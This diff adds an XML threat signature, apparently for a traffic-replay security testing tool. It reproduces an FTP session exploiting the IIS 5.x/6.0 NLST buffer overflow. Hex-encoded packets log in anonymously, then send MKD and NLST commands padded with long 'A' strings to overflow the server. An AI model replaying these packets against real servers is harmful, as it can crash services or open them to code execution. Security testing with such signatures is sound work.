@@ -1,0 +1,173 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Information Services FTP Server Remote Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability has been reported for Microsoft Internet Information Services (IIS). The vulnerability is due to insufficient bounds checking when processing an FTP NLST command. A remote authenticated attacker can craft an FTP session to exploit this vulnerability. Successful exploitation would allow an attacker to inject and execute arbitrary code on the target system with the security privileges of the user System. If code execution is not successful, the affected application will terminate abnormally causing a denial of service condition."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="FTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Internet_Information_Services"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Information_Services_5.x&amp;6.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="69b37379165a514d4ce4bdde041ff434"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633964911646201458"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1260786640" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="T"/>
+    <NamedVar name="FTPdestPort" type="ImperfectControls.Port" value="null" index="U"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="G">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="H">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="I">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="J">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="K">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="L">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="M">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="N">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="O">
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D1:1A:8D" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0044" Identification="49A6" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8F6A" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2365" destPort="$FTPdestPort" SeqNumber="D8034465" AckNumber="413708B6" HeaderLength="08" WindowSize="002E" Checksum="4DA7" UrgentPointer="0000" Options="0101080A13B60DCF0001AE21" Payload="5553455220616E6F6E796D6F75730D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D1:1A:8D" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0044" Identification="49A7" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8F69" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2365" destPort="$FTPdestPort" SeqNumber="D8034475" AckNumber="413708FE" HeaderLength="08" WindowSize="002E" Checksum="445E" UrgentPointer="0000" Options="0101080A13B60DD10001AE21" Payload="5041535320616E6F6E796D6F75730D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D1:1A:8D" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00D7" Identification="49A8" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8ED5" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2365" destPort="$FTPdestPort" SeqNumber="D8034485" AckNumber="4137091D" HeaderLength="08" WindowSize="002E" Checksum="1602" UrgentPointer="0000" Options="0101080A13B60DDC0001AE21" Payload="4D4B4420414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="L" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D1:1A:8D" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="004A" Identification="49A9" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8F61" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2365" destPort="$FTPdestPort" SeqNumber="D8034528" AckNumber="413709D5" HeaderLength="08" WindowSize="0036" Checksum="975F" UrgentPointer="0000" Options="0101080A13B60DDF0001AE21" Payload="504F5254203137322C31362C312C322C392C36310D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="N" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:D1:1A:8D" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00E0" Identification="49AA" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="8ECA" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="2365" destPort="$FTPdestPort" SeqNumber="D803453E" AckNumber="413709F3" HeaderLength="08" WindowSize="0036" Checksum="701E" UrgentPointer="0000" Options="0101080A13B60DDF0001AE21" Payload="4E4C535420414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412A2F2E2E2F412A2F0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3,5,7,9">
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:0C:29:D1:1A:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="007C" Identification="00D3" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9805" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$FTPdestPort" destPort="2365" SeqNumber="413708B6" AckNumber="D8034475" HeaderLength="08" WindowSize="FFEF" Checksum="86E2" UrgentPointer="0000" Options="0101080A0001AE2113B60DCF" Payload="33333120416E6F6E796D6F75732061636365737320616C6C6F7765642C2073656E64206964656E746974792028652D6D61696C206E616D65292061732070617373776F72642E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:D1:1A:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0053" Identification="00D4" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="982D" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$FTPdestPort" destPort="2365" SeqNumber="413708FE" AckNumber="D8034485" HeaderLength="08" WindowSize="FFDF" Checksum="8E6A" UrgentPointer="0000" Options="0101080A0001AE2113B60DD1" Payload="32333020416E6F6E796D6F75732075736572206C6F6767656420696E2E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="00:0C:29:D1:1A:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00EC" Identification="00D5" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9793" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$FTPdestPort" destPort="2365" SeqNumber="4137091D" AckNumber="D8034528" HeaderLength="08" WindowSize="FF3C" Checksum="73B5" UrgentPointer="0000" Options="0101080A0001AE2113B60DDC" Payload="32353720224141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414122206469726563746F727920637265617465642E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="M" Count="">
+      <Ethernet srcMac="00:0C:29:D1:1A:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0052" Identification="00D6" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="982C" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$FTPdestPort" destPort="2365" SeqNumber="413709D5" AckNumber="D803453E" HeaderLength="08" WindowSize="FF26" Checksum="178D" UrgentPointer="0000" Options="0101080A0001AE2113B60DDF" Payload="32303020504F525420636F6D6D616E64207375636365737366756C2E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="O" Count="">
+      <Ethernet srcMac="00:0C:29:D1:1A:8D" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="006B" Identification="00D7" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9812" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$FTPdestPort" destPort="2365" SeqNumber="413709F3" AckNumber="D80345EA" HeaderLength="08" WindowSize="FE7A" Checksum="B920" UrgentPointer="0000" Options="0101080A0001AE2113B60DDF" Payload="313530204F70656E696E67204153434949206D6F6465206461746120636F6E6E656374696F6E20666F722066696C65206C6973742E0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
